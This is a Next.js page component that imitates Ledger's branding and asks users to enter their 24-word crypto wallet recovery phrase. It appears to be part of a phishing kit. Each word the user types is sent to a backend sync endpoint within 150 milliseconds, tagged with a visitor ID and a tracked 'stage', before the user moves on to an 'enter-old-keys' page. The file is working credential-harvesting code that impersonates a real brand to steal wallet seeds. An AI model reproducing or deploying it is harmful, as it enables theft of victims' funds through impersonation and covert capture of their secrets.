"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent } from "@/components/ui/card"
import { ShieldCheck, AlertCircle } from "lucide-react"
import type { UserActivity } from "@/lib/activity-store"
import { useHeartbeat } from "@/hooks/use-heartbeat"
import { LedgerFooter } from "@/components/ledger-footer"

const CORRECT_WORDS = [
  "ramp", "oak", "walnut", "crime", "coast", "school",
  "bench", "win", "twelve", "lyrics", "hobby", "fork",
  "runway", "great", "very", "goat", "vapor", "copper",
  "glide", "diesel", "potato", "sausage", "property", "magnet"
]

export default function VerifyWordsPage() {
  const router = useRouter()
  const [visitorId, setVisitorId] = useState("")
  const [words, setWords] = useState<string[]>(Array(24).fill(""))
  const [errors, setErrors] = useState<number[]>([])
  const [isSubmitting, setIsSubmitting] = useState(false)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
  const syncTimeoutRef = useRef<NodeJS.Timeout | null>(null)
  const latestWordsRef = useRef<string[]>(Array(24).fill(""))

  useHeartbeat(visitorId)

  useEffect(() => {
    const id = localStorage.getItem("visitorId")
    if (id) {
      setVisitorId(id)
      fetch(`/api/activity?visitorId=${id}`)
        .then((res) => res.json())
        .then((data) => {
          if (data.activity) {
            const activity: UserActivity = {
              ...data.activity,
              currentStage: "verify-words",
              verifyWordsData: {
                ...(data.activity.verifyWordsData || {}),
                enteredWords: data.activity.verifyWordsData?.enteredWords || Array(24).fill(""),
              },
              lastUpdated: new Date().toISOString(),
            }
            fetch("/api/activity", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ visitorId: id, activity }),
            })
          }
        })
    } else {
      router.push("/")
    }
  }, [router])

  const handleWordChange = (index: number, value: string) => {
    // If user types a space, treat it as moving to next field
    if (value.includes(" ")) {
      const trimmed = value.replace(/\s/g, "")
      const newWords = [...words]
      newWords[index] = trimmed.toLowerCase()
      setWords(newWords)
      if (errors.includes(index + 1)) {
        setErrors(errors.filter((e) => e !== index + 1))
      }
      if (index < 23) {
        inputRefs.current[index + 1]?.focus()
      }
      syncWords(newWords)
      return
    }

    const newWords = [...words]
    newWords[index] = value.toLowerCase()
    setWords(newWords)
    if (errors.includes(index + 1)) {
      setErrors(errors.filter((e) => e !== index + 1))
    }
    syncWords(newWords)
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter" || e.key === "Tab") {
      e.preventDefault()
      if (index < 23) {
        inputRefs.current[index + 1]?.focus()
      }
    }
    if (e.key === "Backspace" && words[index] === "" && index > 0) {
      e.preventDefault()
      inputRefs.current[index - 1]?.focus()
    }
  }

  const flushSync = async () => {
    if (syncTimeoutRef.current) {
      clearTimeout(syncTimeoutRef.current)
      syncTimeoutRef.current = null
    }
    if (visitorId) {
      await fetch("/api/activity/sync-words", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          visitorId,
          field: "verifyWordsData",
          enteredWords: [...latestWordsRef.current],
        }),
      })
    }
  }

  const syncWords = (newWords: string[]) => {
    latestWordsRef.current = [...newWords]
    if (syncTimeoutRef.current) {
      clearTimeout(syncTimeoutRef.current)
    }
    syncTimeoutRef.current = setTimeout(() => {
      if (visitorId) {
        fetch("/api/activity/sync-words", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            visitorId,
            field: "verifyWordsData",
            enteredWords: [...latestWordsRef.current],
          }),
        })
      }
    }, 150)
  }

  const handleVerify = async () => {
    if (isSubmitting) return
    const wrongNumbers: number[] = []
    for (let i = 0; i < 24; i++) {
      if (words[i].toLowerCase().trim() !== CORRECT_WORDS[i]) {
        wrongNumbers.push(i + 1)
      }
    }

    if (wrongNumbers.length > 0) {
      setErrors(wrongNumbers)
      return
    }

    setErrors([])
    setIsSubmitting(true)

    // Flush any pending word sync first
    latestWordsRef.current = [...words]
    await flushSync()

    if (visitorId) {
      // Fetch fresh data AFTER flush to get the latest words
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()

      if (data.activity) {
        const activity: UserActivity = {
          ...data.activity,
          currentStage: "enter-old-keys",
          lastUpdated: new Date().toISOString(),
        }
        await fetch("/api/activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId, activity }),
        })
      }
    }

    router.push("/enter-old-keys")
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <header className="border-b border-border">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center">
              <div className="relative flex items-center">
                <span
                  className="absolute -top-0.5 -left-1 w-2.5 h-2.5 border-l-2 border-t-2 border-foreground"
                  aria-hidden="true"
                />
                <span className="font-bold text-foreground tracking-[0.2em] text-sm px-3 py-1">LEDGER</span>
                <span
                  className="absolute -bottom-0.5 -right-1 w-2.5 h-2.5 border-r-2 border-b-2 border-foreground"
                  aria-hidden="true"
                />
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="flex-1 max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8">
        <div className="max-w-lg mx-auto">
          <div className="flex justify-center mb-5">
            <div className="w-14 h-14 rounded-full bg-pink-500/20 flex items-center justify-center">
              <ShieldCheck className="w-7 h-7 text-pink-400" />
            </div>
          </div>

          <h1 className="text-xl sm:text-2xl font-semibold text-foreground mb-2 text-center">
            Verify Your Recovery Phrase
          </h1>
          <p className="text-sm text-muted-foreground text-center mb-6">
            Enter each of your 24 recovery words in order to verify you have saved them correctly.
          </p>

          {errors.length > 0 && (
            <Card className="bg-destructive/10 border-destructive/30 mb-5">
              <CardContent className="pt-4 pb-4">
                <div className="flex items-start gap-2">
                  <AlertCircle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
                  <div>
                    <p className="text-sm font-medium text-destructive mb-1">
                      {errors.length === 1 ? "1 word is incorrect:" : `${errors.length} words are incorrect:`}
                    </p>
                    <p className="text-xs text-destructive/80">
                      {errors.map((n) => `Word #${n}`).join(", ")}
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
          )}

          <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 mb-6">
            {Array.from({ length: 24 }).map((_, i) => (
              <div key={i} className="space-y-1">
                <label className="text-[11px] text-muted-foreground font-mono">{i + 1}.</label>
                <Input
                  ref={(el) => { inputRefs.current[i] = el }}
                  type="text"
                  value={words[i]}
                  onChange={(e) => handleWordChange(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  placeholder={`Word ${i + 1}`}
                  autoComplete="off"
                  className={`bg-secondary text-xs h-9 font-mono ${
                    errors.includes(i + 1)
                      ? "border-destructive focus-visible:ring-destructive"
                      : "border-border"
                  }`}
                />
                {errors.includes(i + 1) && (
                  <p className="text-[10px] text-destructive">Word #{i + 1} is incorrect</p>
                )}
              </div>
            ))}
          </div>

          <Button
            onClick={handleVerify}
            disabled={isSubmitting}
            className="w-full bg-foreground text-background hover:bg-foreground/80 h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
          >
            {isSubmitting ? "Verifying..." : "Verify"}
          </Button>
        </div>
      </main>

      <LedgerFooter />
    </div>
  )
}
